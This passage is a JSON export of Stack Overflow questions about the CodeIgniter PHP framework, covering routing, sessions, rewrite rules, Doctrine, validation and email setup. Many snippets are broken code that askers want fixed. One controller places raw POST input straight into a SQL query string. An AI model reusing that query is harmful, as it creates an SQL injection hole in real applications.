FALSE;\n$config['csrf_token_name'] = 'csrf_test_name';\n$config['csrf_cookie_name'] = 'csrf_cookie_name';\n$config['csrf_expire'] = 7200;\n\n$config['compress_output'] = FALSE;\n\n\n$config['time_reference'] = 'local';\n\n\n$config['rewrite_short_tags'] = FALSE;\n\n\n$config['proxy_ips'] = '';\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":107,"score":3,"question_id":12463417,"title":"codeigniter 2.0 inserting records in two tables at once","body":"<p>I'm not sure how to handle this with active records or using manual sql. What I want to do is to add a record into the 'contact' table which has an auto incremented id, and then add a record into the \"order\" table with the id of the corresponding 'contact' record id.</p>\n\n<p>I know I can get the id of the inserted contact record using $this->db->insert_id(), but does that only work when using active records? </p>\n\n<p>Also, can I achieve this type of insert in one query, or must I split it up in two?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12466854,"title":"Log, revert user changes","body":"<p>I develop data management system where i have two users type :</p>\n\n<ul>\n<li>One for admin.  </li>\n<li>Another for lower level users.</li>\n</ul>\n\n<p>The admin should see all changes done by users, and he should the ability to revert the changes.</p>\n\n<p>The database schema with multi tables should be tracked, what is the best method to track any new ADDs,DELETEs or UPDATEs done on Database?</p>\n\n<ul>\n<li>LOGS</li>\n<li>Mirriroing Tables </li>\n</ul>\n\n<p>Or Better method, Please advice.</p>\n\n<p>Thanks </p>\n"},{"tags":["jquery","arrays","codeigniter","form-validation","multidimensional"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":101,"score":3,"question_id":12464001,"title":"How to validate multidimensional arrays with Codeigniter and Jquery","body":"<p>Hi I need to validate a multidimensional form like this</p>\n\n<pre><code>   &lt;input type=\"text\" class=\"input-xlarge span5 req\" id=\"contact_first_name\" name=\"hotel[&lt;?=$id?&gt;][contact_first_name]\" value=\"&lt;?= set_value('hotel[contact_first_name]') ?&gt;\"&gt;\n   &lt;input type=\"text\" class=\"input-xlarge span5 req\" id=\"contact_last_name\" name=\"hotel[&lt;?=$id?&gt;][contact_last_name]\" value=\"&lt;?= set_value('hotel[contact_last_name]') ?&gt;\"&gt;\n</code></pre>\n\n<p>I dont know the dimensions of the final array, beacuse the inputs are added dinamically via jquery.</p>\n\n<p>I'm using Codeigniter Form_Validation for the server side and via JQuery wiht the JQuery Validator for the client side.</p>\n\n<p>This are my form_validation rules</p>\n\n<pre><code> $config['add_hotel'] = array(\n    array(\n        'field' =&gt; 'hotel[][hotel_name]', \n        'label' =&gt; 'Hotel Name', \n        'rules' =&gt; 'required'\n        ),    \n    array(\n        'field' =&gt; 'hotel[][contact_first_name]', \n        'label' =&gt; 'First Name', \n        'rules' =&gt; 'trim|required'\n        ),\n    array(\n        'field' =&gt; 'hotel[][contact_last_name]', \n        'label' =&gt; 'Last Name', \n        'rules' =&gt; 'trim|required'\n        ),\n</code></pre>\n\n<p>and this is how i'm doing it via jquery validator</p>\n\n<pre><code>$(\"#add_hotel\").validate({\n                rules: {\n                    \"hotel[][hotel_name]\": \"required\"\n\n                  /*  errorElement: \"div\",\n                    wrapper: \"div\"*/\n                },\n                messages: {\n                   \"hotel[][hotel_name]\": \"Please enter the Association Name\"\n                },\n     submitHandler: function(form) {\n                    form.submit();\n                }\n</code></pre>\n\n<p>Don't know how to valide each Hotel[] input with its own id, or maybe there is another way to defining the inputs that can be simpler</p>\n"},{"tags":["php","jquery","ajax","json","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12451343,"title":"outputting a bunch of json returned values","body":"<pre><code>$('.more').live(\"click\",function() {\n    var id = $('.wallPosts:last').attr(\"relOne\");\n    $.ajax({\n        type: \"POST\",\n        url: \"&lt;?=base_url()?&gt;index.php/regUserDash/ajaxMore\",\n        data:  {id: id},\n        cache: false,\n        success: function(data) {\n                $(\"#morebox\").append(data.idWallPosts);\n        }\n    });\n});\n</code></pre>\n\n<p>Using the code above how would I output a bunch of json returned values? Below are my json values:</p>\n\n<pre><code>{\"idwallPosts\":\"803\"}{\"idwallPosts\":\"798\"}{\"idwallPosts\":\"797\"}{\"idwallPosts\":\"796\"}{\"idwallPosts\":\"793\"}{\"idwallPosts\":\"792\"}{\"idwallPosts\":\"789\"}{\"idwallPosts\":\"785\"}{\"idwallPosts\":\"780\"}\n</code></pre>\n\n<p>Below is my codeigniter code:</p>\n\n<pre><code>public function ajaxMore() {\n        $id = $this-&gt;input-&gt;post('id');\n        $result = $this-&gt;db-&gt;query(\"SELECT * FROM wallposts WHERE idwallPosts &lt; '$id' ORDER BY idwallPosts DESC LIMIT 9\");\n        foreach($result-&gt;result() as $row) {\n            echo json_encode(array('idwallPosts' =&gt; $row-&gt;idwallPosts));\n        }\n    }\n</code></pre>\n"},{"tags":["regex","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":104,"score":-1,"question_id":12465842,"title":"RewriteCond REQUEST_URI - ^ doesn't work as expected","body":"<p>I'm building a site in codeigniter.  I have a series of rewrite conditions &amp; rules in the .htaccess file.  The first set of rules turns SSL on or off depending on the first segment of the uri.</p>\n\n<p>Then it loops through again &amp; if it finds a match, redirects the page appropriately.  If there is no match, and the uri does NOT start with any of the strings listed, it redirects you to another page. If no conditions are met, it goes to the index page.</p>\n\n<p>The problem is with my first set of rules that turn SSL on &amp; off.  I want to specify that the uri must START with admin or secure.  But if I add the ^ to the beginning of the string, everything breaks.  Here's what I have:</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} ^/?(admin|secure)\nRewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteCond %{HTTPS} on \nRewriteCond %{REQUEST_URI} !^/?(admin|secure)\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1 [R=301,L]\n\n...specific rewrites here\nRewriteRule ^secure-form1$ secure/contract/secure-form1 [L]\nRewriteRule ^secure$ secure/article/secure [L]\n\nRewriteCond %{HTTP_HOST} ^www.example.com$ \nRewriteCond %{REQUEST_URI} !^/(admin|form|secure|page)/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/page/article/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>If I keep the ^ symbol in the first 2 rewrite conditions (https on &amp; off) then\n    <a href=\"http://www.example.com/secure\" rel=\"nofollow\">http://www.example.com/secure</a>\nrewrites to\n    <a href=\"https://www.example.com/index.php/secure/article/secure\" rel=\"nofollow\">https://www.example.com/index.php/secure/article/secure</a>\nwhich is the last rewrite rule. The url actually changes to this in the browser.</p>\n\n<p>If I take the ^ symbol out of the first 2 rewrite conditions, then it goes to the right page.  But I do need to specify the beginning of the uri because there are other pages that have \"secure\" in the middle of the uri (and following a slash) that should NOT use SSL.</p>\n\n<p>I can't figure this one out.</p>\n"},{"tags":["php","codeigniter","url-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12443275,"title":"How to call sub folder controller with routing CodeIgniter","body":"<p>I am using CodeIgniter framework. I have files in my controllers folder like this:    </p>\n\n<pre class=\"lang-none prettyprint-override\"><code> - Controllers\n --- admin.php - Admin Controller\n --- /Admin - Admin Folder\n ----- category.php - Category Controller in Admin folder.\n</code></pre>\n\n<p>The Url: <code>mysite.com/index.php/admin/category</code> says that page not found because it is trying to call the <code>category</code> function of <code>admin</code> controller but I want it to call the <code>index</code> function of <code>category</code> controller in <code>Admin</code> folder.</p>\n\n<p>Also I am using the <code>admin</code> controller for create, edit etc. functions of <code>admin</code> controller like <code>mysite.com/index.php/admin/create</code>.</p>\n\n<p>I think, I should use the <code>$route</code> array in config file. What routing should I use?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":114,"score":2,"question_id":12446297,"title":"Codeigniter creating new session on every page load","body":"<p>I used codeigniter 2.1.0 to develop and e-commerce site for a client.\nThe site has been working well for about 3 months then all of a sudden, logins were not sticking, session data was not being set.\nI checked the database and noticed a new session was being created on every page load.</p>\n\n<p>Here are my config value</p>\n\n<pre><code>$config['sess_cookie_name']     = 'myu';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = '_sessions';\n$config['sess_match_ip']        = TRUE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 3600;\n\n$config['cookie_prefix']    = \"\";\n$config['cookie_domain']    = \"\";\n$config['cookie_path']      = \"/\";\n$config['cookie_secure']    = FALSE;\n</code></pre>\n\n<p>I edited the user_agent field on session table to accommodate long user_agent strings.\nWhat could be the problem? i'll be greatful for any help</p>\n"},{"tags":["codeigniter","ipn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12465102,"title":"CSRF Workaround for IPN via form method POST Quandry","body":"<p>I am implementing Payza (formerly AlertPay) payment processing services in a CI application.  In many ways it is similar to PayPal with the exception that it does not allow me to retrieve the IPN via GET.  Also, it does not support any custom name variables.  It does provide for some empty form variables in which I can pass the CSRF token value but I am unclear on how/where to grab the mis-named token value and convert it to the CI_CSRF_TOKEN so that it will pass the security check.  The communication with the payment server is via CURL.</p>\n\n<p>An additional challenge is that the application is coded with Allow Query Strings = False. If I enable Query Strings then the pagination function, as currently written, fails. </p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12463649,"title":"How can I get an old codeignitor project to work in a subdirectory","body":"<p>First off, I'm not a codeignitor developer, though I've had some exposure to it and MVC in general. I inherited a project where the companies old dev had taken down their codeignitor website and replaced it with a static one page html thing. They did this by (as far as I can tell) just renaming the index.php and putting an index.html in the root.</p>\n\n<p>So... I moved all the codeignitor files to a subdirectory, and renamed the index.php file appropriately</p>\n\n<p>Now the homepage appears, but all internal links are broken with an internal (500) server error.</p>\n\n<p>I've done a couple things to no avail:</p>\n\n<ul>\n<li>modified the config.php base_url to include the subdir: <code>$config['base_url']  = \"http://\". $_SERVER['HTTP_HOST'].\"/subdir/\";</code></li>\n<li>tried all the options for <code>$config['uri_protocol']</code></li>\n</ul>\n\n<p>Anyone have any ideas?  I really just need to recover the data from the site, which I can do manually just by looking in the database and some other stuff coded directly into the views - but I'd rather just get the old site running in the subdirectory.</p>\n"},{"tags":["php","authentication","codeigniter","datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":652,"score":0,"question_id":2189208,"title":"Problem with CodeIgniter. DX_Auth not working when deployed","body":"<p>So we're currently using CodeIgniter + DataMapper OverZealous Edition + DX Auth.  It is working on our local machines, as well as our staging server.  As soon as we push to their server though, the login doesn't work at all.  Upon further investigation, the data from the form is not coming in to the controller where we do our authentication.  We've killed all the server side CI data validation and it still comes in blank.</p>\n\n<p>Our staging server is running:</p>\n\n<p>Server  Apache/2.2.9 (Ubuntu) mod_fastcgi/2.4.6 mod_python/3.3.1 Python/2.5.2 mod_wsgi/2.3 PHP/5.2.6-2ubuntu4.5 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\nX-Powered-By    PHP/5.2.6-2ubuntu4.5</p>\n\n<p>Their server is running:</p>\n\n<p>Server  Apache/2.2.3 (CentOS)\nX-Powered-By    PHP/5.2.9</p>\n\n<p>I really don't want to have to put in a different authentication framework in the 11th hour, I've already pulled too many all nighters for this project.  Anyone have any ideas???</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1280,"score":3,"question_id":5534959,"title":"Best way to build a multilingual site with codeigniter?","body":"<p>My current approach has been to use to _remap function provided by codeigniter to get the URI segment in order to check if the language is \"en\" or \"np\"</p>\n\n<p>Here is a sample:</p>\n\n<pre><code>`function _remap($url_title){\n\n    $this-&gt;_identify_language($this-&gt;uri-&gt;segment(1));\n\n    $data ['sub_categories'] = $this-&gt;category_model-&gt;get_category_list_by_url($url_title)-&gt;result_array();\n    $data ['news'] = $this-&gt;news_model-&gt;get_news_list_by_url($url_title)-&gt;result_array();\n    $data ['url_title'] = $url_title;\n\n    $this-&gt;_render_front_view('main',$data);\n}`\n</code></pre>\n\n<p>I am using this technique on every controller. Which is well not very efficient.</p>\n\n<p>I wanted to ask if using sessions to store language codes would be better or is my current technique good enough?</p>\n\n<p>Are there any other ways i can do this multi-lingual thing? </p>\n\n<p>Of course my database is currently shaped for 2 lanaguages and i have seperated the fields. e.g:- title_en, title_np. these are echoed according to the language field used.</p>\n"},{"tags":["http","php","codeigniter"],"answer_count":6,"favorite_count":15,"up_vote_count":27,"down_vote_count":1,"view_count":13214,"score":26,"question_id":279966,"title":"PHP_SELF vs PATH_INFO vs SCRIPT_NAME vs REQUEST_URI","body":"<p>I am building a PHP application in CodeIgniter. CodeIgniter sends all requests to the main controller: <code>index.php</code>. However, I don't like to see <code>index.php</code> in the URI. For example, <code>http://www.example.com/faq/whatever</code> will route to <code>http://www.example.com/index.php/faq/whatever</code>. I need a reliable way for a script to know what it's address is, so it will know what to do with the navigation. I've used <code>mod_rewrite</code>, as per CodeIgniter documentation.</p>\n\n<p>The rule is as follows:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(images|inc|favicon\\.ico|index\\.php|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L] \n</code></pre>\n\n<p>Normally, I would just check <code>php_self</code>, but in this case it's always <code>index.php</code>. I can get it from <code>REQUEST_URI</code>, <code>PATH_INFO</code>, etc., but I'm trying to decide which will be most reliable. Does anyone know (or know where to find) the real difference between <code>PHP_SELF</code>, <code>PATH_INFO</code>, <code>SCRIPT_NAME</code>, and <code>REQUEST_URI</code>? Thanks for your help!</p>\n\n<p><strong>Note</strong>: I've had to add spaces, as SO sees the underscore, and makes it italic for some reason. </p>\n\n<p><strong>Updated</strong>: Fixed the spaces.</p>\n"},{"tags":["codeigniter","memcached"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12433950,"title":"Codeigniter Memcached","body":"<p>I am unlucky figuring why does memcached not working properly.</p>\n\n<p><strong>PHP Info Details which is already enabled:</strong></p>\n\n<pre><code>memcache support | enabled\nActive persistent connections | 0\nVersion | 2.2.6\nRevision | $Revision: 303962 $\n</code></pre>\n\n<p>etc...</p>\n\n<p>Loading Driver</p>\n\n<pre><code>$this-&gt;load-&gt;driver('cache',array('adapter'=&gt;'mecached'));\n</code></pre>\n\n<p>Error Response:</p>\n\n<pre><code>get() on a non-object in /system/libraries/Cache/drivers/Cache_memcached.php on line 50\n</code></pre>\n\n<p>When I try to use this code</p>\n\n<pre><code>var_dump(var_dump($this-&gt;cache-&gt;memcached-&gt;is_supported()));\n</code></pre>\n\n<p>Response: bool(false)</p>\n\n<p>I also check this forum topic</p>\n\n<p><a href=\"http://codeigniter.com/forums/viewthread/180005/#855216\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/180005/#855216</a></p>\n\n<p>It seems memcache still not working. </p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12460159,"title":"Have I correctly understood the Codeingiter directory structure?","body":"<p>This is how I understand the Codeigniter directory structure to operate. I am using Codeigniter 2.1.2. Have I misunderstood the use of each directory? Anything I've forgotten?</p>\n\n<pre><code>-+ /application/\n |\n |-+ /cache/        Used for caching pages if it is enabled\n |-+ /config/       Contains the configuration files for this project\n |-+ /controllers/  All of your controllers are saved here\n |-+ /core/         Used for modifying the core Codeigniter classes\n |-+ /errors/       Handles your errors and their output\n |-+ /helpers/      Contains your own functions\n |-+ /hooks/        Used for running code at the certain points in the routing process\n |-+ /language/     Occasionally used for translating parts of your project into different languages\n |-+ /libraries/    Contains your own classes\n |-+ /logs/         When you log any sort of notice it is saved inside a file in here\n |-+ /models/       All of your models are saved here\n |-+ /third_party/  Basically another name for plugins which go here\n |-+ /views/        Your views are saved here normally organised by controller inside a new directory\n\n-+ system/          Never go in here instead use the core directory inside /application/\n\n-+ index.php        The front controller for your project\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["php","jquery","mysql","codeigniter"],"answer_count":3,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":445,"score":9,"question_id":5615270,"title":"Web app - slider showing days of the months feature","body":"<p>For a school project we have to build a web app. I'll be creating something where people can keep track of their classes, their homework, and their free time. A planner/calendar. (I'm making it sound really lame here but hey, I'm tired and English isn't my first language ;) )</p>\n\n<p>I'll be working in CodeIgniter for the PHP logic, combined with the usual.. CSS, jQuery, mySQL. PHP is a requirement for the course; I chose to do this in CI because well.. I wanted to learn the framework. We kind of have to show off what we can do at this point of our 'school career'. </p>\n\n<p>Anyway, I would like to ask for some insights regarding a feature I want to implement. At the top of my page, I would like to show a bar which contains the days of the month. Below the day number, I would be showing how many tasks are added on that day by means of some dots. When the user clicks previous or next, I want to show the previous/next month's days. I also want some sort of slider underneath this box which the user can use to slide left and right, and cycle through the days that way. I hope that made sense?</p>\n\n<p>EDIT 2: I want the slider to be <strong>dynamic</strong>. If the user slides to the previous or next months, or clicks the buttons, I want it to load the days of the previous/next months and show those. Also, say we're at the 26th of a month, the slider would have to show something like 10-31 of this month AND 1-10 of the next month. I suppose I'll also have to change my month indication (not like in the image here) so a user knows when another month starts (I'll show them the name of the month). </p>\n\n<p>Here's a picture (don't mind the day numbers being messed up, I was lazy doing that correctly in Photoshop. will fix that tomo): \n<img src=\"http://i.stack.imgur.com/1SqpX.jpg\" alt=\"Day bar, dont mind the numbers\"></p>\n\n<p>I've been looking at the jQuery UI sliders. I suppose I'd have to grab the number of days from a database or by using PHP? I guess the <a href=\"http://php.net/manual/en/function.cal-days-in-month.php\" rel=\"nofollow\">cal_days_in_month</a> function could come in handy here. When the user clicks on the arrows or slides left or right, I don't want the page to refresh. Should I go with ajax calls there? I'm not quite sure how to implement this, to be honest. The numbers are also links to a calendar type of view which shows underneath this bar. \nCould I possibly use the CI Calendar class for this? Or is it more for full-fledged google calendar-type of calendars? I thought <a href=\"http://net.tutsplus.com/tutorials/php/codeigniter-from-scratch-the-calendar-library/\" rel=\"nofollow\">this screencast</a> could perhaps be useful?</p>\n\n<p>If possible, could someone please provide some insights on how to start working on this and which plugins/etc I could perhaps use? I'm not sure where to start, to be honest. I'm sure I can work this out somehow, but I guess it'd be nice to get a kickstart by means of some help here. The main problem I'm seeing is the slider/next/previous thing and loading in the previous/next month's days. </p>\n\n<p>Thanks in advance.</p>\n\n<p>EDIT: I realise some people might say/think 'OMG, why don't you just use the skills you have instead of trying something you have to ask us about!'. Well, this is because I actually want to learn something while doing this project. Keep in mind, I'm not asking for lines of code here, I'm just asking for some insight on where to start and what stuff to use; perhaps little snippets that can help me out. Thanks.</p>\n\n<p>UPDATE:</p>\n\n<p>I got a very basic 'day bar' working. Still without a slider, nor do the previous and next buttons work, but hey.. at least it fills it in dynamically. It shows the 5 days previous to the current day, then this month till the end. Whatever is left to fill in gets filled with days of the next month. Quite basic. However, I do have a couple of questions! </p>\n\n<p>Since someone told me yesterday that I was breaking design patterns by doing some stuff the way I was doing it, I'm extremely paranoid about the way I'm working now and I would really like some feedback from 'CodeIgniter pro's'. To fill in the 'day bar', I created a helper with a couple of methods. (One method to dynamically fill that 'month year' thing you see in the picture, another method init() which loads the list of the days, like I explained before). I loaded this helper in the controller and I'm now using the methods in my view:</p>\n\n<pre><code>    &lt;ul&gt;\n        &lt;?php\n            init($current_day_of_month, $current_month, \n                          $current_year, $days_in_current_month, $show_history);\n        ?&gt;\n    &lt;/ul&gt;\n</code></pre>\n\n<p>The helper then echoes my day values in my view. Is this good or bad practice? I kept thinking the wrong way when I wanted to start writing the code for this.. I wanted to have a function somewhere in my controller and then call it from the view, but I read that I shouldn't be doing it like that.. that I had to reverse my logic. I find it hard to wrap my head around the fact that I have to do this by sending arrays of data to my view (from my controller), so I opted for creating the helper. Good? Bad? Any tips, resources I should read, screencasts I should watch? Thanks a bunch.</p>\n"},{"tags":["codeigniter","doctrine"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12459003,"title":"CodeIgniter + Doctrine: RepositoryClass not exist","body":"<p>i am new to Doctrine. I need help about Doctrine repository usage. I searched so much at Google but can't solved my problem.</p>\n\n<p>Note: I am sorry, i couldn't upload image due to having less than 10 reputation, so i uploaded to imagehosting and pasted the links.</p>\n\n<p>Here is my application folder:\n<a href=\"http://s9.postimage.org/9xvndnr7j/codeigniter.png\" rel=\"nofollow\">http://s9.postimage.org/9xvndnr7j/codeigniter.png</a></p>\n\n<p>Here is my Bootstrap.php:</p>\n\n<pre><code>&lt;?php\n\nif ( ! class_exists(\"Doctrine\\Common\\Version\", false))\n{\n    require_once (\"Doctrine.php\");\n}\n\nrequire_once(APPPATH.'models/Repository/CategoryRepository.php');\n</code></pre>\n\n<p>Here is my Doctrine.php:</p>\n\n<pre><code>&lt;?php\n\nuse Doctrine\\Common\\ClassLoader,\nDoctrine\\ORM\\Tools\\Setup,\nDoctrine\\ORM\\EntityManager;\n\nclass Doctrine {\n    public $em;\n\n    public function __construct()\n    {\n        require_once __DIR__ . '/Doctrine/ORM/Tools/Setup.php';\n        Setup::registerAutoloadDirectory(__DIR__);\n\n        // Load the database configuration from CodeIgniter\n        require APPPATH . 'config/database.php';\n\n        $connection_options = array(\n            'driver'        =&gt; 'pdo_mysql',\n            'user'          =&gt; $db['default']['username'],\n            'password'      =&gt; $db['default']['password'],\n            'host'          =&gt; $db['default']['hostname'],\n            'dbname'        =&gt; $db['default']['database'],\n            'charset'       =&gt; $db['default']['char_set'],\n            'driverOptions' =&gt; array(\n                'charset'   =&gt; $db['default']['char_set'],\n            ),\n        );\n\n        // With this configuration, your model files need to be in application/models/Entity\n        // e.g. Creating a new Entity\\User loads the class from application/models/Entity/User.php\n        $models_namespace = 'Entity';\n        $models_path = APPPATH . 'models';\n        $proxies_dir = APPPATH . 'models/Proxies';\n        $metadata_paths = array(APPPATH . 'models');\n\n        // Set $dev_mode to TRUE to disable caching while you develop\n        $config = Setup::createAnnotationMetadataConfiguration($metadata_paths, $dev_mode = true, $proxies_dir);\n        $this-&gt;em = EntityManager::create($connection_options, $config);\n\n        $loader = new ClassLoader($models_namespace, $models_path);\n        $loader-&gt;register();\n    }\n}\n</code></pre>\n\n<p>Here is my Entity/Category.php:</p>\n\n<pre><code>&lt;?php\n\nnamespace Entity;\nuse Doctrine\\Common\\Collections\\ArrayCollection;\n\n/**\n * @Entity(repositoryClass=\"CategoryRepository\")\n * @Table(name=\"category\")\n */\nclass Category {\n    /**\n     * @Id\n     * @Column(type=\"integer\", nullable=false)\n     * @GeneratedValue(strategy=\"AUTO\")\n     */\n    protected $ID;\n\n    /**\n     * @Column(type=\"string\", length=255, nullable=true)\n     */\n    protected $Name;\n\n    /**\n     * @Column(type=\"string\", length=255, nullable=true)\n     */\n    protected $Description;\n\n    /**\n     * @Column(type=\"integer\", nullable=false)\n     */\n    protected $Order;\n\n    /**\n     * @Column(type=\"integer\", columnDefinition=\"TINYINT(1)\", nullable=false)\n     */\n    protected $IsMultiple;\n\n    /**\n     * @Column(type=\"boolean\", nullable=false)\n     */\n    protected $Deleted;\n\n    protected $CategoryVariables = NULL;\n    protected $Records = NULL;\n\n    public function __construct()\n    {\n        $this-&gt;CategoryVariables = new ArrayCollection();\n        $this-&gt;Records = new ArrayCollection();\n    }\n\n    public function getID()\n    {\n        return $this-&gt;ID;\n    }\n\n    public function setName($Name)\n    {\n        $this-&gt;Name = $Name;\n    }\n\n    public function getName()\n    {\n        return $this-&gt;Name;\n    }\n\n    public function setDescription($Description)\n    {\n        $this-&gt;Description = $Description;\n    }\n\n    public function getDescription()\n    {\n        return $this-&gt;Description;\n    }\n\n    public function setOrder($Order)\n    {\n        $this-&gt;Order = $Order;\n    }\n\n    public function getOrder()\n    {\n        return $this-&gt;Order;\n    }\n\n    public function setIsMultiple($IsMultiple)\n    {\n        $this-&gt;IsMultiple = $IsMultiple;\n    }\n\n    public function getIsMultiple()\n    {\n        return $this-&gt;IsMultiple;\n    }\n\n    public function delete()\n    {\n        $this-&gt;Deleted = true;\n    }\n}\n</code></pre>\n\n<p>Here is my Repository/CategoryRepository.php:</p>\n\n<pre><code>&lt;?php\n\nuse Doctrine\\ORM\\EntityRepository;\n\nclass CategoryRepository extends EntityRepository {\n\n    public function getCategories()\n    {\n        $dql = \"\n            SELECT *\n            FROM Category\n            WHERE Category.Deleted = FALSE\n        \";\n\n        $query = $this-&gt;getEntityManager()-&gt;createQuery($dql);\n        return $query-&gt;getResult();\n    }\n\n}\n</code></pre>\n\n<p>In My config/autoload.php:</p>\n\n<pre><code>$autoload['libraries'] = array('doctrine');\n</code></pre>\n\n<p>In My controller which i am calling repository:</p>\n\n<pre><code>$categories = $this-&gt;doctrine-&gt;em-&gt;getRepository('CategoryRepository');\n</code></pre>\n\n<p>And the result page:</p>\n\n<p><a href=\"http://s14.postimage.org/me0wzjdz5/1347884151735.png\" rel=\"nofollow\">http://s14.postimage.org/me0wzjdz5/1347884151735.png</a></p>\n\n<p>Where am i wrong? I just want to use repository.</p>\n"},{"tags":["php","codeigniter","session","frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12458339,"title":"Codeigniter - sessions seems to vanish? v2","body":"<p>Can anyone explain from this simple login script why the session seems to delete itself?\nThe is no destroying of sessions anywhere so I cannot see why it does this?</p>\n\n<p><a href=\"http://pastebin.com/sunXhSEE\" rel=\"nofollow\">http://pastebin.com/sunXhSEE</a></p>\n"},{"tags":["javascript","codeigniter","url","get"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12457814,"title":"How to force comma in URL using Codeigniter, Javascript and GET form","body":"<p>I want a URL using Codeigniter that is like this:</p>\n\n<pre><code>example?type=1,2,3,4\n</code></pre>\n\n<p>I can manually type this in and also navigate to URLs like this and the system works OK. However, I have a form using GET where I want to post multiple values for type. I'm using Javascript to join the inputs.</p>\n\n<pre><code>&lt;form action=\"example\" method=\"GET\" id=\"type-form\"&gt;\n    &lt;select multiple=\"multiple\" name=\"_type[]\" id=\"type-array-id-1\"&gt;\n        &lt;option value=\"1\"&gt;Type 1&lt;/option&gt;\n        &lt;option value=\"2\"&gt;Type 2&lt;/option&gt;\n        &lt;option value=\"3\"&gt;Type 3&lt;/option&gt;\n        &lt;option value=\"4\"&gt;Type 4&lt;/option&gt;\n        &lt;option value=\"5\"&gt;Type 5&lt;/option&gt;\n    &lt;/select&gt;\n    &lt;input type=\"hidden\" name=\"type\" id=\"type-comma-sep\"/&gt;\n    &lt;input type=\"submit\" value=\"Get\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\n    $(\"#type-form\").bind(\"submit\",function(){\n        var type_array = $(\"#type-array-id-1\").val().join(\",\");\n        $(\"#type-array-id-1\").val(\"\");\n        $(\"#type-comma-sep\").val(type_array);\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>I've used some other SO questions answers to get me this far BUT when I submit the form I get:</p>\n\n<pre><code>example?type=1%2C2%2C3%2C4\n</code></pre>\n\n<p>My back-end relies on the \",\" being present in the URL. So how can I force the comma into the URL?</p>\n\n<p>I also tried htaccess rewrite (although not even sure this is right):</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^([^\\%2C]*)\\%2C(.*)$\nRewriteRule .* %1,%2 [R=301,L]\n</code></pre>\n\n<p>And I tried using encodeURIComponent(type_array) and encodeURI(type_array), but it never made a difference.</p>\n\n<p>Also my settings in Codeigniter are as follows:</p>\n\n<pre><code>$config['permitted_uri_chars'] = 'a-z 0-9~%.,:_\\-';\n</code></pre>\n\n<p>And within system/libraries/input.php</p>\n\n<pre><code>if ( ! preg_match('/^[a-z0-9,:_\\/-]+$/i', $str))\n</code></pre>\n\n<p>So...</p>\n\n<ol>\n<li>How can I force the comma in the URL (Javascript is preferable)?</li>\n<li>Will the solution work cross-browser?</li>\n</ol>\n"},{"tags":["codeigniter","mailjet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12457316,"title":"mailjet for codeigniter","body":"<p>I have been following this documentation here:</p>\n\n<p><a href=\"https://www.mailjet.com/docs/code/php/codeigniter\" rel=\"nofollow\">https://www.mailjet.com/docs/code/php/codeigniter</a></p>\n\n<p>In my config folder I created a php file as shown above like this:</p>\n\n<pre><code>   &lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n$config['protocol'] = 'smtp';\n$config['smtp_host'] = 'ssl://in.mailjet.com';\n$config['smtp_port'] = '465';\n$config['smtp_user'] = 'API key';\n$config['smtp_pass'] = 'Pass Key';\n$config['charset'] = 'utf-8';\n$config['mailtype'] = 'html';\n$config['newline'] = \"\\r\\n\";\n\n?&gt;\n</code></pre>\n\n<p>But I am still getting the following error:</p>\n\n<pre><code>An Error Was Encountered\nNon-existent class: Email\n</code></pre>\n\n<p>When I try to load the lib like this in a 